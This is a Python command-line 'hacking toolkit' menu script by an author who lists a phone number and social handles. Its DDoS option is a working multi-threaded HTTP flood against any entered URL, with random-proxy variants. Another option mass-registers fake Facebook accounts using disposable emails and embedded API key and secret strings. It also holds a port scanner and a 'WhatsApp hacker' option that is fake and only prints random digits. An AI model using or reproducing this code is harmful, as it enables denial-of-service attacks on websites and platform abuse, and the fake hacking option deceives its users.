import os
os.system('pip install faker ')
os.system('pip install Faker ')
os.system('pip install json ')
os.system('pip install string ')
os.system('pip install random ')
os.system('pip install requests ')
os.system('clear')
#icone&collor


g = "\033[92m"
y = "\033[00m"
s = "\033[96m"
t = "\033[91m"
yy = "\033[93m"
bgr ="\033[101m"
bgp ="\033[104m"
p ="\033[101m"
print("")
print(g+"                      ▂▄▅▅▄▂.")
print(g+"                     ███████]▄▄▄▄▄▄▄▄▄▄▃...")


print("                 ▂▄▅█████████▅▄▃▂...")


print("              [███████████████████]...")


print("           ...◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤.......")
print(bgp+"                                                                 ")
#معلومات المصمم

print(y+"")
print(yy+" B7X phone number:"+t+"+201286337949")

print(yy+" B7X Telegram: "+t+"@programmer_366")


print(yy+" B7X youtube: "+t+"https://youtube.com/@b7x-oy5fw?si=M3RrO81A0tul0FYm")


#list


print("")
print(s+"___________________")
print("|♛ TANK MOD B7X  ♛|."+yy+"..........................................")

print(s+"——————————————————————————————————————————————————————————"+yy+"   :") 
print(s+"[1] fake account            "+g+"✓"+s+"  [2] watsapp hacker       "+g+"✓"+s+"¦."+yy+"..:...")
print(s+"[3] web ping                "+g+"✓"+s+"  [4] Number information   "+g+"✓"+s+"¦."+yy+"......")
print(s+"[5] Ddos Attack             "+g+"✓"+s+"  [6] password maker       "+g+"✓"+s+"¦."+yy+"......")

print(s+"[7] Port checker            "+g+"✓"+s+"  [8] Download Youtube vid "+g+"✓"+s+"¦."+yy+"......")


print(s+"[9] Checking passwords      "+g+"✓"+s+"  [10] Exit                "+g+"✓"+s+"¦."+yy+"......")


print(s+"——————————————————————————————————————————————————————————")

print("")


#tool

name = input(g+" ~ "+y+("$"))
if name == "1":
	import requests
	import random
	import string
	import json
	import hashlib
	from faker import Faker
	def generate_random_string(length):
	    letters_and_digits = string.ascii_letters + string.digits
	    return ''.join(random.choice(letters_and_digits) for i in range(length))
	def get_mail_domains():
	    url = "https://api.mail.tm/domains"
	    try:
	        response = requests.get(url)
	        if response.status_code == 200:
	            return response.json()['hydra:member']
	        else:
	            print(f'[×] E-mail Error : {response.text}')
	            return None
	    except Exception as e:
	        print(f'[×] Error : {e}')
	        return None
	def create_mail_tm_account():
	    fake = Faker()
	    mail_domains = get_mail_domains()
	    if mail_domains:
	        domain = random.choice(mail_domains)['domain']
	        username = generate_random_string(10)
	        password = fake.password()
	        birthday = fake.date_of_birth(minimum_age=18, maximum_age=45)
	        first_name = fake.first_name()
	        last_name = fake.last_name()
	        url = "https://api.mail.tm/accounts"
	        headers = {"Content-Type": "application/json"}
	        data = {"address": f"{username}@{domain}", "password":password}       
	        try:
	            response = requests.post(url, headers=headers, json=data)
	            if response.status_code == 201:
	                print(f'[√] Email Created')
	                return f"{username}@{domain}", password, first_name, last_name, birthday
	            else:
	                print(f'[×] Email Error : {response.text}')
	                return None, None, None, None, None
	        except Exception as e:
	            print(f'[×] Error : {e}')
	            return None, None, None, None, None
	def register_facebook_account(email, password, first_name, last_name, birthday):
	    api_key = '882a8490361da98702bf97a021ddc14d'
	    secret = '62f8ce9f74b12f84c123cc23437a4a32'
	    gender = random.choice(['M', 'F'])
	    req = {'api_key': api_key,'attempt_login': True,'birthday': birthday.strftime('%Y-%m-%d'),'client_country_code': 'EN','fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod','fb_api_req_friendly_name': 'registerAccount','firstname': first_name,'format': 'json','gender': gender,'lastname': last_name,'email': email,'locale': 'en_US','method': 'user.register','password': password,'reg_instance': generate_random_string(32),'return_multiple_errors': True}
	    sorted_req = sorted(req.items(), key=lambda x: x[0])
	    sig = ''.join(f'{k}={v}' for k, v in sorted_req)
	    ensig = hashlib.md5((sig + secret).encode()).hexdigest()
	    req['sig'] = ensig
	    api_url = 'https://b-api.facebook.com/method/user.register'
	    reg = _call(api_url, req)
	    id=reg['new_user_id']
	    token=reg['session_info']['access_token']
	    print(f'''[+] Email : {email}
	[+] ID : {id}
	[+] Token : {token}
	[+] PassWord : {password}
	[+] Name : {first_name} {last_name}
	[+] BirthDay : {birthday}
	[+] Gender : {gender}
	===================================''')
	def _call(url, params, post=True):
	    headers = {'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]'}
	    if post:
	        response = requests.post(url, data=params, headers=headers)
	    else:
	        response = requests.get(url, params=params, headers=headers)
	    return response.json()
	for i in range(int(input('[+] How Many Accounts : '))):
	 email, password, first_name, last_name, birthday = create_mail_tm_account()
	 if email and password and first_name and last_name and birthday:
	  register_facebook_account(email, password, first_name, last_name, birthday)

if name == '3':
	
	
	import requests
	import socket
	from ping3 import ping
	import time
	
	def get_ip_addresses(url):
	    try:
	        response = requests.get(url)
	        domain = url.split("//")[-1].split("/")[0]
	        ip_addresses = socket.gethostbyname_ex(domain)
	        return ip_addresses
	    except Exception as e:
	        print("An error occurred:", e)
	
	def test_website_responsiveness(url, country_name, country_code):
	    target_url = url.split("//")[-1].split("/")[0]
	    response_time = ping(target_url, unit='ms', timeout=2, size=32)
	    if response_time is not None:
	        if response_time < 100:
	            speed_status = "Very fast"
	            color = "\033[92m"
	        elif response_time < 300:
	            speed_status = "Fast"
	            color = "\033[93m"
	        else:
	            speed_status = "Slow"
	            color = "\033[91m"
	        print(f"Response time from \033[94m{country_name}\033[0m ({country_code}): {color}{response_time} ms ({speed_status})\033[0m - {time.strftime('%H:%M:%S')}")
	    else:
	        print(f"\033[91mConnection timeout out from {country_name}\033[0m ({country_code}) - {time.strftime('%H:%M:%S')}")
	url = input("[+] Please enter the website URL or NCX URL: ")
	ip_addresses = get_ip_addresses(url)
	ip_addresses_list = ip_addresses[2]
	print("IP addresses and ports associated with the weite:")
	previous_color = ""
	for index, ip in enumerate(ip_addresses_list, start=1):
	    color = "\033[91m" if ip.startswith('104') else "\033[93m" if ip.startswith('172') else "\033[92m"
	    port = 80
	    reset_color = "\033[0m"
	    print(f"Address number {index}: {color}{ip}\033[0m (Default port {color}\033[95m{port}{reset_color}\033[0m)")
	print("\033[0m")
	print("Testing website responsiveness from different countries...")
	countries = [
	    ("United States", "US"),
	    ("United Kingdom", "GB"),
	    ("Germany", "DE"),
	    ("France", "FR"),
	    ("Japan", "JP"),
	    ("Saudi Arabia", "SA"),
	    ("United Arab Emirates", "AE"),
	    ("Egypt", "EG"),
	    ("Iraq", "IQ"),
	    ("Syria", "SY"),
	    ("Jordan", "JO"),
	    ("Lebanon", "LB"),
	    ("Kuwait", "KW"),
	    ("Bahrain", "BH"),
	    ("Qatar", "QA"),
	    ("Oman", "OM"),
	    ("Yemen", "YE"),
	    ("Sudan", "SD"),
	    ("Libya", "LY"),
	    ("Tunisia", "TN"),
	    ("Algeria", "DZ"),
	    ("Morocco", "MA")
	]
	for country_name, country_code in countries:
	    test_website_responsiveness(url, country_name, country_code)
	    time.sleep(1)

	

	
	
	
#new	
	
if name == '2':
	nome = input("[+] Cantore code:")
	if nome =='+20'or'+1':
		nme = input("[+] Watsapp number you want hacke it:")
		print("")
		print(g+" »» "+t+"Watsapp number:"+y+nome+nme)
		
		import random
		
		x = random.randrange(1,9)
		c = random.randrange(1,9)
		v = random.randrange(1,9)
		b = random.randrange(1,9)
		n = random.randrange(1,9)
		m = random.randrange(1,9)
		print(g+" »» "+t+"Watsapp code :"+y,x,c,v,"_",b,n,m)

	
	
#here








if name == '5':
	
	from datetime import datetime
	import socket
	import threading
	import urllib.request
	import argparse
	import random
	from user_agent import generate_user_agent
	from urllib.request import ProxyHandler, build_opener
	from pyfiglet import Figlet
	F = '\033[1;32m'
	Z = '\033[1;31m'
	S = '\033[1;33m'
	B = '\x1b[38;5;208m'
	
	fig = Figlet(font='slant')
	logo = fig.renderText(f'Ddos Attack')
	
	print(logo)
	def linked():
	    sg = input(
	        f'''
	
{Z}[1] Attack withOut Proxy
	
{S}[2] Attack With Paroxy
	
{S}[{S}⌯{S}]{F}ChooSe Attack {F}» '''
	    )
	    if sg == '1':
	        for _ in range(500):
	            threading.Thread(target=AttackMahos).start()
	    elif sg == '2':
	        for _ in range(500):
	            threading.Thread(target=ProxyAttack).start()
	
	def AttackMahos():
	    while True:
	        headers = {
	            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	            'Accept-Language': 'en-us,en;q=0.5',
	            'Accept-Encoding': 'gzip,deflate',
	            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
	            'Keep-Alive': '115',
	            'Connection': 'keep-alive',
	            'User-Agent': generate_user_agent()
	        }
	        try:
	            req = urllib.request.urlopen(
	                urllib.request.Request(url, headers=headers)
	            )
	            if req.status == 200:
	                print(f'{F}GOOD Attack: {url}')
	            else:
	                print(f'{Z}BAD Attack: {url}')
	        except:
	            print(f'{S}DOWN: {url}')
	def ProxyAttack():
	    while True:
	        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
	        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
	        port = random.choice(pl)
	        proxy = ip + ":" + str(port)
	        headers = {
	            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	            'Accept-Language': 'en-us,en;q=0.5',
	            'Accept-Encoding': 'gzip,deflate',
	            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
	            'Keep-Alive': '115',
	            'Connection': 'keep-alive',
	            'User-Agent': generate_user_agent()
	        }
	        try:
	            proxy_handler = ProxyHandler({'http': 'http://' + proxy})
	            opener = build_opener(proxy_handler)
	            req = opener.open(urllib.request.Request(url, headers=headers))
	            if req.status == 200:
	                print(f'{F}GOOD Attack: {url} | {proxy}')
	            else:
	                print(f'{Z}BAD Attack: {url} | {proxy}')
	        except:
	            print(f'{S}DOWN: {url} |')
	
	
	
	url = input(f' {B}ENTER URL OR IP ADDRESS : ')
	linked()
	


if name == '4':
	
	import phonenumbers
	from phonenumbers import geocoder,carrier, timezone
	
	c = "\033[92m"
	
	
	b = "\033[95m"
	
	
	h = input("[+] Enter phone number and country code:")
	p = phonenumbers.parse(h, None)
	
	print(b+" number »»"+c,p)
	
	
	print(b+" country »»"+c,geocoder.description_for_number(p, "en"))
	
	print(b+" carrier »»"+c,carrier.name_for_number(p, "en"))
	
	print(b+" timezone »»"+c,timezone.time_zones_for_geographical_number(p))
	
	print(b+" call »»"+c,callable.__call__(p))
	
	print(y+"")
	
	
	
if name == '6':
	
	
	import random

	p = "\033[92m"
	from pyfiglet import Figlet
	fig = Figlet(font='slant')
	logo = fig.renderText(f'password maker B7X')
		
	print(logo)
	
	
	r = "\033[95m"
	
	s = "\033[93m"
	
	print(r+"________________________________________________")
	print("")
	print(r+"  [1] Start")
	print("____________________________________________")
	
	print("")
	
	e = input(s+" »» ")
	
	
	
	
	ci = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM*#@$&%~"
	
	
	
	if e == '1':
		
	
		
		passs = ""
	for i in range(30):
		passs += random.choice(ci)
		
		print(p+" »» Your password:"+p+passs)
		
			
		
	

if name == '7':
	import  socket

	z = "\033[95m"
	ž = "\033[92m"
	œ = "\033[96m"
	ÿ = "\033[93m"
	ł = "\033[91m"
	
	k = input(z+"[+] start from port (1)»» ")
	l = input("[+] finis by port (2)»» ")
	a = input("[+] set time to examine port »» ")
	q = input("[+] set url to examine »» ")
	open_ports = []
	
	print("")
	
	print(œ+"_________________________________________________________________")
	print("")
	
	
	print(" Start scaning on "+q)
	
	print("_________________________________________________________________")
	print(œ)
	
	
	for port in range(int(k), int(l)):
		try:
			soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			soc.settimeout(int(a))
			soc.connect((q, port))
			open_ports.append(port)
			print(ž+f" [{port}] »» [THIS PORT IS OPEN]»»{socket.getservbyport(port)}")
		except:
				print(ł+f" [{port}] »» [THIS PORT IS CLOSE]")
				
				
	
	print("")
	
	print("_________________________[OPENING PORTS]_________________________")
	
	
	
	for x in open_ports:
		print("")
		print(ž+f" [{x}] »» [THIS PORT IS OPEN]")
	
		
		
if name == '8':
	
	from pytube import  YouTube


	ń = "\033[94m"
	
	ô = "\033[96m"
	
	ā = "\033[91m"
	
	url = input(ń+' [+] Video Url : ')
	print("")
	print(ô+"                        Set Filter")
	
	print(ā+" [1] 144p                                         [2] 240p")
	
	print(" [3] 360p                                         [4] 480p")
	
	print(" [5] 720p                                         [6] 1080p")
	print("")
	
	call = input(ń+' [+] Filter : ')
	
	
	if call == '1':
		p = 144
	
	if call == '2':
		p = 240
		
	if call == '3':
		p = 360
		
	if call == '4':
		p = 480
		
	if call == '5':
		p = 720
		
	if call == '6':
		p = 1080
		
	
	yt=YouTube(url)
	
	
	video=yt.streams.filter(res=p).first()
	video.download("/storage/emulated/0/Download")
	
	
	
if name =='9':
	
	import re

	ń = "\033[91m"
	
	o = "\033[92m"
	
	def check_password_strength(password):
	    # القواعد المختلفة لتحديد قوة كلمة المرور
	    length_error = len(password) < 8
	    digit_error = re.search(r"\d", password) is None
	    uppercase_error = re.search(r"[A-Z]", password) is None
	    lowercase_error = re.search(r"[a-z]", password) is None
	    symbol_error = re.search(r"[ @!#$%^&*()_+=-]", password) is None
	
	    # إذا لم تتحقق أي من الشروط، كلمة المرور قوية
	    password_ok = not (length_error or digit_error or uppercase_error or lowercase_error or symbol_error)
	
	    return {
	        'password_ok': password_ok,
	        'length_error': length_error,
	        'digit_error': digit_error,
	        'uppercase_error': uppercase_error,
	        'lowercase_error': lowercase_error,
	        'symbol_error': symbol_error,
	    }
	
	def main():
	    password = input(" Enter the password to verify its strength: ")
	    result = check_password_strength(password)
	
	    if result['password_ok']:
	        print(o+"_______________________________________________")
	        
	        print("")
	        print(o+"The password is strong .")
	        print("_______________________________________________")
	    else:
	        
	        print(ń+"_______________________________________________")
	        print("")
	        print(ń+"The password is weak .")
	        print("_______________________________________________")
	        print("")
	        if result['length_error']:
	            print("يجب أن تحتوي كلمة المرور على 8 أحرف على الأقل.")
	        if result['digit_error']:
	            print("يجب أن تحتوي كلمة المرور على رقم واحد على الأقل.")
	        if result['uppercase_error']:
	            print("يجب أن تحتوي كلمة المرور على حرف كبير واحد على الأقل.")
	        if result['lowercase_error']:
	            print("يجب أن تحتوي كلمة المرور على حرف صغير واحد على الأقل. ")
	        if result['symbol_error']:
	            print("يجب أن تحتوي كلمة المرور على رمز خاص واحد على الأقل (مثل @، !، #، $، إلخ).")
	            
	            print("_______________________________________________")
	            print("")
	            print(" Password must contain at least 8 characters.") 
	            if result['digit_error']: 
	             print(" Password must contain at least 1 digit.") 
	            if result['uppercase_error']: 
	             print( " The password must contain at least one uppercase letter.") 
	            if result['lowercase_error']: 
	             print(" The password must contain at least one lowercase letter.") 
	            if result['symbol_error']: 
	             print( " Your password must contain at least one special character (such as @, !, #, $, etc.)." )
	
	if __name__ == "__main__":
	    main()
		
	
	
	
#here
	if name == '10':
		print("")
		import os
		os.system('clear')
		print("")
else:
	p ="\033[101m"
	print(p+"                           finish                                ")
	print(y+"")
	
if name == '10':
		print("")
		import os
		os.system('clear')
		print("")
	

